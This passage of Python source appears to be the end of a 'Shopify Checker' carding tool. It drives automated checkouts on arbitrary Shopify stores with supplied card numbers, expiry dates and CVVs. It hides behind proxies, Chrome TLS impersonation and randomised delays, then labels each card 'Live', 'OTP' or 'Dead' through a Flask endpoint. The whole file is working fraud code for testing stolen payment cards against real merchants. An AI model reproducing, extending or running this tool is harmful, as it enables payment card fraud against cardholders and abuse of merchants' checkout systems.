            if 'errors' in resp: return False, f"GraphQL Error: {'; '.join([e.get('message', '') for e in resp.get('errors', [])])}", ""
                
            sd = resp.get('data', {}).get('submitForCompletion', {})
            if not sd: return False, f"Missing submit response: {text[:150]}", ""
            
            rtype = sd.get('__typename', '')
            if rtype in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                rcpt = sd.get('receipt', {})
                if rcpt.get('__typename') == 'ProcessedReceipt': return True, "ORDER_PLACED", ""
                rid = rcpt.get('id', '')
                if not rid: return False, "Missing Receipt ID in Submit", ""
                return True, "POLL", rid
            elif rtype == 'SubmitFailed': return False, extract_clean_response(sd.get('reason', '')), ""
            elif rtype == 'SubmitRejected':
                errs = sd.get('errors', [])
                if errs:
                    for e in errs:
                        code = e.get('code', '')
                        if code: return False, code, ""
                return False, "Submit Rejected", ""
            return False, rtype, ""
        except Exception as e: return False, f"Error parsing submit: {str(e)}", ""

    async def poll_receipt(self, session, receipt_id: str) -> Tuple[bool, str]:
        if not receipt_id: return False, "NO_RECEIPT_ID"
        json_data = {'query': QUERY_POLL, 'variables': {'receiptId': receipt_id, 'sessionToken': self.sst}, 'operationName': 'PollForReceipt'}
        
        sleep_time = 1.5
        last_text = ""
        for _ in range(15):
            await asyncio.sleep(sleep_time)
            success, text = await self._graphql_req(session, json_data)
            if not success: return False, text
            last_text = text
            try:
                resp = json.loads(text)
                if 'errors' in resp: return False, f"Poll Error: {'; '.join([e.get('message', '') for e in resp['errors']])}"
                    
                rdata = resp.get('data', {}).get('receipt', {})
                if not rdata: break
                    
                tname = rdata.get('__typename', '')
                if tname == 'ProcessedReceipt': return True, "ORDER_PLACED"
                elif tname == 'ActionRequiredReceipt': return True, "OTP_REQUIRED"
                elif tname == 'FailedReceipt':
                    err = rdata.get('processingError', {})
                    code = err.get('code') or err.get('__typename') or 'UNKNOWN_ERROR'
                    if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                        msg = err.get('messageUntranslated')
                        if msg: return False, msg
                    return False, code
                elif tname in ('ProcessingReceipt', 'WaitingReceipt'):
                    delay_ms = rdata.get('pollDelay', 1500)
                    sleep_time = min(max(delay_ms / 1000.0, 1.5), 4.0)
                else: break
            except: break
            
        if last_text:
            final_lower = last_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower: return True, "OTP_REQUIRED"
            elif 'processedreceipt' in final_lower: return True, "ORDER_PLACED"
            code = extract_between(last_text, '{"code":"', '"')
            if code: return False, code
        return False, "POLL_TIMEOUT"

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None) -> Tuple[bool, str, str, str, str, str, float, float]:
    cc_info = {'cc': cc, 'mes': mes, 'ano': ano, 'cvv': cvv}
    checkout = ShopifyCheckoutSession(site_url, cc_info, variant_id)
    proxies = get_curl_proxy(proxy_str)
    
    try:
        async with AsyncSession(impersonate="chrome124", proxies=proxies, timeout=60) as session:
            
            try:
                warmup_headers = checkout.get_navigate_headers()
                resp = await session.get(checkout.site_url, headers=warmup_headers, timeout=15, allow_redirects=True)
                final_url = str(resp.url).split('?')[0].rstrip('/')
                checkout.site_url = final_url
                checkout.domain = urlparse(final_url).netloc
                
                await asyncio.sleep(random.uniform(0.5, 1.2))
                await session.get(f"{checkout.site_url}/cart", headers=warmup_headers, timeout=10)
                await asyncio.sleep(random.uniform(0.8, 1.5))
            except Exception: pass
                
            ok, msg = await checkout.fetch_product_if_needed(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            ok, msg = await checkout.add_to_cart(session)
            if not ok:
                with _cache_lock:
                    if checkout.site_url in _VARIANT_CACHE: del _VARIANT_CACHE[checkout.site_url]
                checkout.variant_id = None
                ok, msg = await checkout.fetch_product_if_needed(session)
                if ok: ok, msg = await checkout.add_to_cart(session)
                if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            await asyncio.sleep(random.uniform(1.5, 2.5))
            
            ok, msg = await checkout.init_checkout(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            await asyncio.sleep(random.uniform(1.5, 2.5))
            ok, msg = await checkout.negotiate_shipping(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            ok, msg = await checkout.negotiate_delivery(session)
            if not ok: return False, msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            ok, token_msg = await checkout.tokenize_card(session)
            if not ok: return False, token_msg, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            ok, status, rid = await checkout.submit_payment(session, token_msg)
            if not ok: return False, status, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            if status != "POLL": return True, status, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
            
            ok, final_status = await checkout.poll_receipt(session, rid)
            return ok, final_status, checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount

    except RequestsError as e: return False, f"Proxy/TLS Error: {str(e)}", checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
    except asyncio.TimeoutError: return False, "Network Timeout", checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount
    except Exception as e: return False, f"Process Error: {str(e)}", checkout.gateway, checkout.running_total, checkout.currency, checkout.subtotal, checkout.tax_amount, checkout.shipping_amount

app = Flask(__name__)

@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc', '').strip()
        proxy_str = request.args.get('proxy')
        variant_id = request.args.get('variant')
        
        if not site: return jsonify({"error": "Missing 'site' parameter", "status": "Dead"}), 400
        if not cc_string: return jsonify({"error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV", "status": "Dead"}), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc, mes, ano, cvv = cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv']
        except ValueError as e:
            return jsonify({"error": str(e), "status": "Dead"}), 400
        
        success, message, gateway, price, currency, subtotal, tax, ship = asyncio.run(
            process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str)
        )
        
        clean_response = extract_clean_response(message)
        hit_status = _classify_status(success, clean_response)

        try:
            sub_val = float(subtotal) if subtotal else 0.0
            tax_val = float(tax) if tax else 0.0
            ship_val = float(ship) if ship else 0.0
            total_val = sub_val + tax_val + ship_val
            price_str = f"${total_val:.2f} [Min Prod: ${sub_val:.2f} | Tax: ${tax_val:.2f} | Ship: ${ship_val:.2f}]"
        except (ValueError, TypeError):
            price_str = f"Sum Error [Min Prod: {subtotal} | Tax: {tax} | Ship: {ship}]"

        if hit_status in ["ORDER_PLACED", "INSUFFICIENT_FUNDS"]: final_status = "Live"
        elif hit_status == "OTP_REQUIRED": final_status = "OTP"
        else: final_status = "Dead"

        return jsonify({
            "Currency": currency, "Gateway": gateway, "Price": price_str,
            "RawResponse": message, "Response": clean_response, "Status": final_status, "cc": cc_string
        })
        
    except Exception as e:
        logger.error(f"Flask API Error: {str(e)}")
        return jsonify({
            "Currency": "USD", "Gateway": "UNKNOWN", "Price": "$0.00 [Min Prod: $0.00 | Tax: $0.00 | Ship: $0.00]",
            "RawResponse": str(e), "Response": "ERROR", "Status": "Dead", "cc": request.args.get('cc', '')
        }), 500

@app.route("/")
def home():
    return "<h1>Welcome to my app 🚀</h1><p>Server is running.</p>"

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8080))
    logger.info(f"Starting Shopify Checker API on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
